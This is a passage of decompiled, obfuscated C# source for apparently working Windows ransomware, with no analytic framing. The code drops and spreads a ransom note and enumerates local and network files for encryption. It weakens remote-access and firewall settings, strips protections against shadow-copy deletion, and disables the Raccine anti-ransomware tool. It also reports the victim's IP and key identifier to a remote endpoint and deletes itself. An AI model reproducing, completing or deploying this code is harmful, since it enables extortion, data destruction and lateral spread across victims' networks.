gDQpEZWNyeXB0aW9uIG9mIHlvdXIgZmlsZXMgd2l0aCB0aGUgaGVscCBvZiB0aGlyZCBwYXJ0aWVzIG1heSBjYXVzZSBpbmNyZWFzZWQgcHJpY2UgKHRoZXkgYWRkIHRoZWlyIGZlZSB0byBvdXIpIG9yIHlvdSBjYW4gYmVjb21lIGEgdmljdGltIG9mIGEgc2NhbS4g"));
				streamWriter.WriteLine("\r\n");
				streamWriter.WriteLine(XKJIixIieoUFn("S2V5IElkZW50aWZpZXI6IA=="));
				streamWriter.WriteLine(EYfwAXYBCnnA);
				if (jOXeuDmfknLZmaw == "NO")
				{
					streamWriter.WriteLine("\r\n");
					streamWriter.WriteLine(XKJIixIieoUFn("TnVtYmVyIG9mIGZpbGVzIHRoYXQgd2VyZSBwcm9jZXNzZWQgaXM6IA==") + Convert.ToString(fuxMXSqYBU.Count));
				}
				if (YxnJxsROHGpBEI)
				{
					streamWriter.WriteLine("\r\n");
					streamWriter.WriteLine(XKJIixIieoUFn("UEMgSGFyZHdhcmUgSUQ6IA=="));
					streamWriter.WriteLine(CmYAejDgYJsctGHm.tGhpPKuyPxdeK());
				}
			}
			else
			{
				string text3 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.txt");
				if (!text3.Contains(EYfwAXYBCnnA) && !xSIJBVFhcrJvfz)
				{
					File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.txt", "\r\nAdditional KeyId:\r\n" + EYfwAXYBCnnA);
				}
			}
		}
		catch
		{
		}
		int num = 0;
		foreach (string item in HBwkcxyqvEtVP)
		{
			num++;
			try
			{
				if (item == Environment.GetFolderPath(Environment.SpecialFolder.Desktop))
				{
					continue;
				}
			}
			catch
			{
			}
			try
			{
				if (!File.Exists(item + "\\RESTORE_FILES_INFO.txt"))
				{
					File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.txt", item + "\\RESTORE_FILES_INFO.txt", overwrite: true);
				}
				else
				{
					string text4 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.txt");
					if (!text4.Contains(EYfwAXYBCnnA) && !xSIJBVFhcrJvfz)
					{
						File.AppendAllText(item + "\\RESTORE_FILES_INFO.txt", "\r\nAdditional KeyId:\r\n" + EYfwAXYBCnnA);
					}
				}
			}
			catch (Exception)
			{
			}
			if (!SeIVHExHnFbe && num > 10)
			{
				break;
			}
		}
		if (loOsBKSBxFRcB == "YES")
		{
			try
			{
				if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.hta"))
				{
					using StreamWriter streamWriter2 = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.hta");
					streamWriter2.WriteLine(XKJIixIieoUFn("MESSAGERICH"));
					streamWriter2.WriteLine("\r\n");
					streamWriter2.WriteLine(XKJIixIieoUFn("PHAgc3R5bGU9InRleHQtYWxpZ246IGNlbnRlcjsiPktleSBJZGVudGlmaWVyOiA="));
					streamWriter2.WriteLine(EYfwAXYBCnnA + XKJIixIieoUFn("PC9wPg=="));
					if (jOXeuDmfknLZmaw == "NO")
					{
						streamWriter2.WriteLine("\r\n");
						streamWriter2.WriteLine(XKJIixIieoUFn("PHAgc3R5bGU9InRleHQtYWxpZ246IGNlbnRlcjsiPg==") + XKJIixIieoUFn("TnVtYmVyIG9mIGZpbGVzIHRoYXQgd2VyZSBwcm9jZXNzZWQgaXM6IA==") + Convert.ToString(fuxMXSqYBU.Count) + XKJIixIieoUFn("PC9wPg=="));
					}
					if (YxnJxsROHGpBEI)
					{
						streamWriter2.WriteLine("\r\n");
						streamWriter2.WriteLine(XKJIixIieoUFn("UEMgSGFyZHdhcmUgSUQ6IA=="));
						streamWriter2.WriteLine(CmYAejDgYJsctGHm.tGhpPKuyPxdeK());
					}
				}
				else
				{
					string text5 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.txt");
					if (!text5.Contains(EYfwAXYBCnnA) && !xSIJBVFhcrJvfz)
					{
						File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.hta", XKJIixIieoUFn("PHAgc3R5bGU9InRleHQtYWxpZ246IGNlbnRlcjsiPg==") + "\r\nAdditional KeyId:\r\n" + EYfwAXYBCnnA + XKJIixIieoUFn("PC9wPg=="));
					}
				}
			}
			catch
			{
			}
		}
		if (QWuujtXggD == "YES")
		{
			try
			{
				if (jOXeuDmfknLZmaw == "NO")
				{
					CmYAejDgYJsctGHm.wKTHnKvpbQDn("URL", "USERNAME", "ACCESO", string.Concat(XKJIixIieoUFn("Q2xpZW50IElQOiA="), new WebClient().DownloadString(XKJIixIieoUFn("aHR0cDovL2ljYW5oYXppcC5jb20=")), "\r", XKJIixIieoUFn("RGF0ZSBvZiBlbmNyeXB0aW9uOiA="), DateTime.Now, "\r\n", XKJIixIieoUFn("UG9zc2libGUgYWZmZWN0ZWQgZmlsZXM6IA=="), Convert.ToString(fuxMXSqYBU.Count), "\r\n", XKJIixIieoUFn("Q2xpZW50IFVuaXF1ZSBJZGVudGlmaWVyIEtleTog"), EYfwAXYBCnnA));
				}
				else
				{
					CmYAejDgYJsctGHm.wKTHnKvpbQDn("URL", "USERNAME", "ACCESO", string.Concat(XKJIixIieoUFn("Q2xpZW50IElQOiA="), new WebClient().DownloadString(XKJIixIieoUFn("aHR0cDovL2ljYW5oYXppcC5jb20=")), "\r", XKJIixIieoUFn("RGF0ZSBvZiBlbmNyeXB0aW9uOiA="), DateTime.Now, "\r\n", XKJIixIieoUFn("UG9zc2libGUgYWZmZWN0ZWQgZmlsZXM6IA=="), Convert.ToString(fuxMXSqYBU.Count), "\r\n", XKJIixIieoUFn("Q2xpZW50IFVuaXF1ZSBJZGVudGlmaWVyIEtleTog"), EYfwAXYBCnnA));
				}
			}
			catch
			{
			}
		}
		if (TCMFYCtZHazxTT == "YES")
		{
			try
			{
				CysxxFHafrrT.koKekQJgdzI(new Uri(""));
			}
			catch
			{
			}
		}
		if (loOsBKSBxFRcB == "NO")
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.txt"))
				{
					Process.Start(XKJIixIieoUFn("bm90ZXBhZC5leGU="), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.txt");
				}
			}
			catch
			{
			}
		}
		else
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.hta"))
				{
					Process.Start(XKJIixIieoUFn("bXNodGEuZXhl"), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.hta");
				}
			}
			catch
			{
			}
		}
		if (!string.IsNullOrEmpty(majPzACQkKB))
		{
			try
			{
				File.Delete(majPzACQkKB);
			}
			catch
			{
			}
		}
		if (NCDJhjhxMjo)
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.txt"))
				{
					string string_ = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.txt");
					pkHhrOfZHJu.WeyoshcoNjGG(string_);
				}
			}
			catch
			{
			}
		}
		if (HRuXHUgomikt)
		{
			try
			{
				File.AppendAllText(kCftkBXDnujA, "All Done!");
			}
			catch (Exception)
			{
			}
		}
		if (wPjpaPwfPqLO == "EVET")
		{
			mWgakOzIXDFLwyIcHK();
		}
	}

	public static void mkkQKvYnpGX()
	{
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show(XKJIixIieoUFn("VGhpcyBwcm9ncmFtIHJlcXVpcmVzIE1pY3Jvc29mdCAuTkVUIEZyYW1ld29yayB2LiA0LjgyIG9yIHN1cGVyaW9yIHRvIHJ1biBwcm9wZXJseQ=="), XKJIixIieoUFn("SW5mb3JtYXRpb24uLi4="), (MessageBoxButtons)0, (MessageBoxIcon)16);
	}

	private static int vutfsBLsCQB(int int_0, int int_1)
	{
		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		byte[] array = new byte[4];
		rNGCryptoServiceProvider.GetBytes(array);
		int seed = BitConverter.ToInt32(array, 0);
		return new Random(seed).Next(int_0, int_1);
	}

	public static List<string> xjEfBjOwMJhykw(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		Stack<string> stack = new Stack<string>(20);
		stack.Push(string_0);
		while (stack.Count > 0)
		{
			string text = stack.Pop();
			string[] directories;
			try
			{
				directories = Directory.GetDirectories(text);
			}
			catch
			{
				continue;
			}
			string[] array = null;
			try
			{
				if (!text.Contains("C:\\Program Files\\") && !text.Contains("C:\\Program Files (x86)\\") && !text.Contains(":\\Windows\\") && !text.ToLower().Contains("perflogs") && !text.ToLower().Contains("internet explorer") && !text.Contains(":\\ProgramData\\") && !text.Contains("\\AppData\\") && !text.ToLower().Contains("msocache") && !text.ToLower().Contains("system volume information") && !text.ToLower().Contains("boot") && !text.ToLower().Contains("tor browser") && !text.ToLower().Contains("mozilla") && !text.ToLower().Contains("appdata") && !text.ToLower().Contains("google chrome") && !text.ToLower().Contains("application data"))
				{
					array = Directory.GetFiles(text);
					goto IL_0155;
				}
			}
			catch
			{
			}
			continue;
			IL_0155:
			string[] array2 = array;
			foreach (string fileName in array2)
			{
				try
				{
					FileInfo fileInfo = new FileInfo(fileName);
					if (!fileInfo.FullName.Contains("autoexec.bat") && !fileInfo.FullName.Contains("desktop.ini") && !fileInfo.FullName.Contains("autorun.inf") && !fileInfo.FullName.Contains("ntuser.dat") && !fileInfo.FullName.Contains("NTUSER.DAT") && !fileInfo.FullName.Contains("iconcache.db") && !fileInfo.FullName.Contains("bootsect.bak") && !fileInfo.FullName.Contains("boot.ini") && !fileInfo.FullName.Contains("ntuser.dat.log") && !fileInfo.FullName.Contains("thumbs.db") && !fileInfo.FullName.ToLower().Contains("bootmgr") && !fileInfo.FullName.ToLower().Contains("pagefile.sys") && !fileInfo.FullName.ToLower().Contains("config.sys") && !fileInfo.FullName.ToLower().Contains("ntuser.ini") && !fileInfo.FullName.Contains(XKJIixIieoUFn("QnVpbGRlcl9Mb2c=")) && !fileInfo.FullName.Contains("RSAKeys") && !fileInfo.FullName.Contains("Config.enc") && !fileInfo.FullName.Contains("RESTORE_FILES_INFO") && !fileInfo.FullName.EndsWith(".[Tiberiano@aol.com].getin") && !fileInfo.FullName.EndsWith("exe") && !fileInfo.FullName.EndsWith("dll") && !fileInfo.FullName.EndsWith("EXE") && !fileInfo.FullName.EndsWith("DLL") && !fileInfo.FullName.Contains("Recycle.Bin") && !fileInfo.FullName.Contains(GkzMChUYOUNM) && !fileInfo.FullName.Contains(kCftkBXDnujA) && !fileInfo.FullName.Contains(TRKfvCCpnWOZ))
					{
						if (File.Exists(fileInfo.FullName) && (double)fileInfo.Length <= double.Parse(dpqRUXsALKm) * 1024.0 * 1024.0 && GcmmzKkiyaeM == "YES")
						{
							list.Add(fileInfo.FullName);
							jZtJHYGNvMQ(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
						else if (File.Exists(fileInfo.FullName) && GcmmzKkiyaeM == "NO")
						{
							list.Add(fileInfo.FullName);
							jZtJHYGNvMQ(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
					}
				}
				catch
				{
				}
			}
			string[] array3 = directories;
			foreach (string item in array3)
			{
				stack.Push(item);
			}
		}
		return list;
	}

	public static void kVFVpxHvum()
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_0023: Unknown result type (might be due to invalid IL or missing references)
		//IL_0029: Expected O, but got Unknown
		ManagementObjectSearcher val = new ManagementObjectSearcher("select * from Win32_NetworkConnection");
		ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				if (!nlODfRjnVhuyHV.Contains(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace("\\\\", "\\").Replace("\\\\\\\\", "\\\\")
					.Replace("\"", "")
					.Split(new char[1] { '(' })[0].Trim()))
				{
					nlODfRjnVhuyHV.Add(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace("\\\\", "\\").Replace("\\\\\\\\", "\\\\")
						.Replace("\"", "")
						.Split(new char[1] { '(' })[0].Trim().Replace("IPC$", ""));
				}
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
	}

	public static string kpitRsUfUPt(string ODVFhreqzEs = "", string opmHdTXAcekP = "")
	{
		string result = "";
		try
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = ODVFhreqzEs,
				Arguments = opmHdTXAcekP,
				UseShellExecute = false,
				RedirectStandardOutput = true,
				StandardOutputEncoding = Encoding.GetEncoding(850)
			};
			Process process2 = process;
			process2.Start();
			result = process2.StandardOutput.ReadToEnd();
			process2.WaitForExit(2500);
			process2.Kill();
			return result;
		}
		catch
		{
			return result;
		}
	}

	public static void UjWDfWwPuJs(string string_0)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = "powershell",
			Arguments = string_0,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
	}

	public static string zzsZUpEDaqFx(string string_0)
	{
		char[] array = string_0.ToCharArray();
		Array.Reverse((Array)array);
		return new string(array);
	}

	public static string XKJIixIieoUFn(string string_0)
	{
		byte[] bytes = Convert.FromBase64String(string_0);
		return Encoding.UTF8.GetString(bytes);
	}

	private static void VGyXmLKVRNf()
	{
		//IL_01f7: Unknown result type (might be due to invalid IL or missing references)
		//IL_01fe: Expected O, but got Unknown
		//IL_0220: Unknown result type (might be due to invalid IL or missing references)
		//IL_0227: Expected O, but got Unknown
		ueqGtQtumYE();
		List<bZZGaZmrvLrM> list = bZZGaZmrvLrM.lYafdGzADRKW();
		foreach (bZZGaZmrvLrM item in list)
		{
			rpGvmuBdwBJBrud.Add(item.IPAddress);
		}
		List<string> source = rpGvmuBdwBJBrud;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate1a == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate1a = delegate(string string_0)
			{
				vugnkECkUbG CS_0024_003C_003E8__locals0 = new vugnkECkUbG();
				CS_0024_003C_003E8__locals0.otfYEvvRNGn = string_0;
				if ((!CS_0024_003C_003E8__locals0.otfYEvvRNGn.StartsWith("10.") && !CS_0024_003C_003E8__locals0.otfYEvvRNGn.StartsWith("172.") && !CS_0024_003C_003E8__locals0.otfYEvvRNGn.StartsWith("192.168.") && !CS_0024_003C_003E8__locals0.otfYEvvRNGn.StartsWith("")) || !IvbJmHRnKzXS.zKGiVDaeLxwG(CS_0024_003C_003E8__locals0.otfYEvvRNGn))
				{
					return;
				}
				try
				{
					Thread.Sleep(PAsRAwMADTR);
					nlODfRjnVhuyHV.Add("\\\\" + CS_0024_003C_003E8__locals0.otfYEvvRNGn + "\\Users");
					try
					{
						if (mGPgYiqNVpxAeD)
						{
							Console.WriteLine("\\\\" + CS_0024_003C_003E8__locals0.otfYEvvRNGn + "\\Users");
						}
					}
					catch
					{
					}
					Parallel.For(68, 91, delegate(int int_0)
					{
						Thread.Sleep(PAsRAwMADTR);
						nlODfRjnVhuyHV.Add("\\\\" + CS_0024_003C_003E8__locals0.otfYEvvRNGn + "\\" + (char)int_0 + "$");
						try
						{
							if (mGPgYiqNVpxAeD)
							{
								Console.WriteLine("\\\\" + CS_0024_003C_003E8__locals0.otfYEvvRNGn + "\\" + (char)int_0 + "$");
							}
						}
						catch
						{
						}
					});
				}
				catch
				{
				}
			};
		}
		Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegate1a);
		try
		{
			if (mGPgYiqNVpxAeD)
			{
				Console.WriteLine("Network scanning completed...");
			}
		}
		catch
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			try
			{
				string string_ = zzsZUpEDaqFx("tVGdzl3UcNXZpNWas9GUc52bpNnclZFduVmcyV3QcN3dvRmbpdFX0Z2bz9mcjlWTcVkUBdFVG90U");
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(XKJIixIieoUFn(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.SetValue(XKJIixIieoUFn("TG9jYWxBY2NvdW50VG9rZW5GaWx0ZXJQb2xpY3k="), 1, RegistryValueKind.DWord);
					registryKey.SetValue(XKJIixIieoUFn("RW5hYmxlTGlua2VkQ29ubmVjdGlvbnM="), 1, RegistryValueKind.DWord);
					registryKey.Close();
				}
			}
			catch
			{
			}
		}
		if (auzZFIZJxkg == "YES")
		{
			try
			{
				string text = Path.GetTempFileName().Replace(".tmp", ".bat");
				File.WriteAllText(text, XKJIixIieoUFn("bW91bnR2b2wgfCBmaW5kICJ9XCIgPiB2LnR4dAoKKEZvciAvRiAlJWkgSW4gKHYudHh0KSBEbyAoCiAgICAgIFNldCBmcmVlZHJpdmU9MAogICAgICBGT1IgJSVkIElOIChDIEQgRSBGIEcgSCBJIEogSyBMIE0gTiBPIFAgUSBSIFMgVCBVIFYgVyBYIFkgWikgRE8gKAogICAgICAgICAgICBJRiBOT1QgRVhJU1QgJSVkOlwgKAogICAgICAgICAgICAgICAgICBJRiAiIWZyZWVkcml2ZSEiPT0iMCIgKAogICAgICAgICAgICAgICAgICAgICAgICBTZXQgZnJlZWRyaXZlPSUlZAogICAgICAgICAgICAgICAgICApCiAgICAgICAgICAgICkKICAgICAgKQogICAgICBtb3VudHZvbCAhZnJlZWRyaXZlITogJSVpCiAgICAgIHBpbmcgLW4gMiAxMjcuMC4wLjEKKSkKU2V0IGRyaXZlaWQ9MApGT1IgJSVkIElOIChDIEQgRSBGIEcgSCBJIEogSyBMIE0gTiBPIFAgUSBSIFMgVCBVIFYgVyBYIFkgWikgRE8gKAogICAgICBJRiBFWElTVCAlJWQ6XCAoCiAgICAgICAgICAgIFNldCAvYSBkcml2ZWlkKz0xCiAgICAgICAgICAgIGVjaG8gXjxTaGFyZWRGb2xkZXIgbmFtZT0iIWRyaXZlaWQhIiBob3N0UGF0aD0iJSVkOlwiIHdyaXRhYmxlPSJ0cnVlIi9ePiA+PnNmLnR4dAogICAgICAgICAp"), Encoding.ASCII);
				kpitRsUfUPt("cmd.exe", "/C " + text);
				if (File.Exists(text))
				{
					File.Delete(text);
				}
				if (File.Exists(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), "v.txt")))
				{
					File.Delete(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), "v.txt"));
				}
				if (File.Exists(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), "sf.txt")))
				{
					File.Delete(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), "sf.txt"));
				}
			}
			catch
			{
			}
		}
		try
		{
			if (mGPgYiqNVpxAeD)
			{
				Console.WriteLine("Scanning for manually mapped resources...");
			}
		}
		catch
		{
		}
		ManagementObjectSearcher val = new ManagementObjectSearcher("select * from Win32_NetworkConnection");
		ManagementObjectEnumerator enumerator2 = val.Get().GetEnumerator();
		try
		{
			while (enumerator2.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator2.get_Current();
				if (nlODfRjnVhuyHV.Contains(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace("\\\\", "\\").Replace("\\\\\\\\", "\\\\")
					.Replace("\"", "")
					.Split(new char[1] { '(' })[0].Trim()))
				{
					continue;
				}
				try
				{
					if (mGPgYiqNVpxAeD)
					{
						Console.WriteLine(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace("\\\\", "\\").Replace("\\\\\\\\", "\\\\")
							.Replace("\"", "")
							.Split(new char[1] { '(' })[0].Trim().Replace("IPC$", ""));
					}
				}
				catch
				{
				}
				nlODfRjnVhuyHV.Add(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace("\\\\", "\\").Replace("\\\\\\\\", "\\\\")
					.Replace("\"", "")
					.Split(new char[1] { '(' })[0].Trim().Replace("IPC$", ""));
			}
		}
		finally
		{
			((IDisposable)enumerator2)?.Dispose();
		}
		try
		{
			if (mGPgYiqNVpxAeD)
			{
				Console.WriteLine("Scanning for manually mapped resources completed...");
			}
		}
		catch
		{
		}
	}

	public static bool zlbfMUOYxADw()
	{
		WebRequest webRequest = WebRequest.Create("https://www.google.com/");
		try
		{
			webRequest.GetResponse();
		}
		catch
		{
			return false;
		}
		return true;
	}

	public static void gevYUdZEuEUkvJoG(string string_0)
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = XKJIixIieoUFn("cG93ZXJzaGVsbC5leGU=");
		processStartInfo.Arguments = "& " + string_0;
		processStartInfo.RedirectStandardError = true;
		processStartInfo.RedirectStandardOutput = true;
		processStartInfo.UseShellExecute = false;
		processStartInfo.CreateNoWindow = true;
		Process process = new Process();
		process.StartInfo = processStartInfo;
		process.Start();
	}

	private static bool OgqjasYecM(string string_0, string string_1)
	{
		try
		{
			FileSystemAccessRule rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.None, PropagationFlags.NoPropagateInherit, AccessControlType.Allow);
			DirectoryInfo directoryInfo = new DirectoryInfo(string_1);
			DirectorySecurity accessControl = directoryInfo.GetAccessControl(AccessControlSections.Access);
			accessControl.ModifyAccessRule(AccessControlModification.Set, rule, out var modified);
			if (!modified)
			{
				return false;
			}
			rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.InheritOnly, AccessControlType.Allow);
			accessControl.ModifyAccessRule(AccessControlModification.Add, rule, out modified);
			if (!modified)
			{
				return false;
			}
			directoryInfo.SetAccessControl(accessControl);
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static string NEbmKrywKGUTpZ(SecureString secureString_0)
	{
		string empty = string.Empty;
		IntPtr intPtr = Marshal.SecureStringToBSTR(secureString_0);
		try
		{
			return Marshal.PtrToStringBSTR(intPtr);
		}
		finally
		{
			Marshal.ZeroFreeBSTR(intPtr);
		}
	}

	public static void qjYSJxRuGcjBQqN()
	{
		try
		{
			if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				return;
			}
			string string_ = zzsZUpEDaqFx("==wcu9Wa0B3Tg42bpRXdjVGeFBSZslmRgU2Zh1WSc52bpNnclZFduVmcyV3QcRlTgM3dvRmbpdFX0Z2bz9mcjlWTcVkUBdFVG90U");
			try
			{
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(XKJIixIieoUFn(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(XKJIixIieoUFn("dnNzYWRtaW4uZXhl"));
					registryKey.DeleteSubKey(XKJIixIieoUFn("d21pYy5leGU="));
					registryKey.DeleteSubKey(XKJIixIieoUFn("d2JhZG1pbi5leGU="));
					registryKey.DeleteSubKey(XKJIixIieoUFn("YmNkZWRpdC5leGU="));
					registryKey.DeleteSubKey(XKJIixIieoUFn("cG93ZXJzaGVsbC5leGU="));
					registryKey.DeleteSubKey(XKJIixIieoUFn("ZGlza3NoYWRvdy5leGU="));
					registryKey.DeleteSubKey(XKJIixIieoUFn("bmV0LmV4ZQ=="));
					registryKey.Close();
				}
				string_ = zzsZUpEDaqFx("u9Wa0F2YpxGcwFEXn9GT05WZ2VEXzV2YpZnclNFX0V2Us9mc052bDRnblJnc1NEXNVEVTl1U");
				registryKey = Registry.LocalMachine.OpenSubKey(XKJIixIieoUFn(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(XKJIixIieoUFn("UmFjY2luZQ=="));
					registryKey.Close();
				}
				string_ = zzsZUpEDaqFx("=UkUBdFVG90U");
				registryKey = Registry.LocalMachine.OpenSubKey(XKJIixIieoUFn(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(XKJIixIieoUFn("UmFjY2luZQ=="));
					registryKey.Close();
				}
				string_ = zzsZUpEDaqFx("=UkUBdFVG90U");
				registryKey = Registry.CurrentUser.OpenSubKey(XKJIixIieoUFn(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(XKJIixIieoUFn("UmFjY2luZQ=="));
					registryKey.Close();
				}
			}
			catch
			{
			}
			kpitRsUfUPt(XKJIixIieoUFn("dGFza2tpbGw="), XKJIixIieoUFn("L0YgL0lNIFJhY2NpbmVTZXR0aW5ncy5leGU="));
			kpitRsUfUPt(XKJIixIieoUFn("cmVn"), XKJIixIieoUFn("ZGVsZXRlICJIS0NVXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1biIgL1YgIlJhY2NpbmUgVHJheSIgL0Y="));
			kpitRsUfUPt(XKJIixIieoUFn("cmVn"), XKJIixIieoUFn("ZGVsZXRlIEhLQ1VcU29mdHdhcmVcUmFjY2luZSAvRg=="));
			kpitRsUfUPt(XKJIixIieoUFn("c2NodGFza3M="), XKJIixIieoUFn("L0RFTEVURSAvVE4gIlJhY2NpbmUgUnVsZXMgVXBkYXRlciIgL0Y="));
		}
		catch
		{
		}
	}

	public static void sOpOdEXhKGvUT(string string_0, byte[] byte_0)
	{
		try
		{
			byte[] bytes = Encoding.ASCII.GetBytes(XKJIixIieoUFn("R290QWxsRG9uZQ=="));
			using FileStream fileStream = new FileStream(string_0, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			fileStream.Write(byte_0, 0, byte_0.Length);
			fileStream.Write(bytes, 0, bytes.Length);
		}
		catch (Exception)
		{
		}
	}

	public static void JIRmedCilrZR()
	{
		string string_ = zzsZUpEDaqFx("==QblR3c5NVZslmRcx2byRnbvNEX0V2Us9mc052bDRnblJnc1NEXNVEVTl1U");
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(XKJIixIieoUFn(string_), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(XKJIixIieoUFn("TG9uZ1BhdGhzRW5hYmxlZA=="), 1, RegistryValueKind.DWord);
				registryKey.Close();
			}
		}
		catch
		{
		}
	}

	public static void ueqGtQtumYE()
	{
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			kpitRsUfUPt(XKJIixIieoUFn("bmV0c2g="), XKJIixIieoUFn("YWR2ZmlyZXdhbGwgZmlyZXdhbGwgc2V0IHJ1bGUgZ3JvdXA9XCJOZXR3b3JrIERpc2NvdmVyeVwiIG5ldyBlbmFibGU9WWVz"));
			kpitRsUfUPt(XKJIixIieoUFn("bmV0c2g="), XKJIixIieoUFn("YWR2ZmlyZXdhbGwgZmlyZXdhbGwgc2V0IHJ1bGUgZ3JvdXA9XCJGaWxlIGFuZCBQcmludGVyIFNoYXJpbmdcIiBuZXcgZW5hYmxlPVllcw=="));
		}
	}

	public static void mWgakOzIXDFLwyIcHK()
	{
		kpitRsUfUPt("cmd.exe", XKJIixIieoUFn("L0MgcGluZyAxMjcuMC4wLjcgLW4gMyA+IE51bCAmIGZzdXRpbCBmaWxlIHNldFplcm9EYXRhIG9mZnNldD0wIGxlbmd0aD01MjQyODgg4oCcJXPigJ0gJiBEZWwgL2YgL3Eg4oCcJXPigJ0="));
		string text = XKJIixIieoUFn("L0MgY2hvaWNlIC9DIFkgL04gL0QgWSAvVCAzICYgRGVsIA==");
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Arguments = "\"" + text + "\"" + Assembly.GetEntryAssembly()!.Location;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.FileName = "cmd.exe";
		Process.Start(processStartInfo);
		Environment.Exit(0);
	}

	public static void ETxqPZpYmRRS(string string_0)
	{
		try
		{
			FileAttributes attributes = File.GetAttributes(string_0);
			if ((attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
			{
				File.SetAttributes(string_0, attributes & ~FileAttributes.ReadOnly);
			}
			attributes = File.GetAttributes(string_0);
			if ((attributes & FileAttributes.Hidden) == FileAttributes.Hidden)
			{
				File.SetAttributes(string_0, attributes & ~FileAttributes.Hidden);
			}
		}
		catch (Exception ex)
		{
			if (HRuXHUgomikt)
			{
				try
				{
					File.AppendAllText(kCftkBXDnujA, "File: " + string_0 + " - Error while removing readonly attribute: " + ex.Message + "\r\n");
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	public static string gotnrzqTwtuXaGE()
	{
		OperatingSystem oSVersion = Environment.OSVersion;
		Version version = oSVersion.Version;
		string text = "";
		if (oSVersion.Platform == PlatformID.Win32Windows)
		{
			switch (version.Minor)
			{
			case 90:
				text = "Me";
				break;
			case 10:
				text = ((!(version.Revision.ToString() == "2222A")) ? "98" : "98SE");
				break;
			case 0:
				text = "95";
				break;
			}
		}
		else if (oSVersion.Platform == PlatformID.Win32NT)
		{
			switch (version.Major)
			{
			case 3:
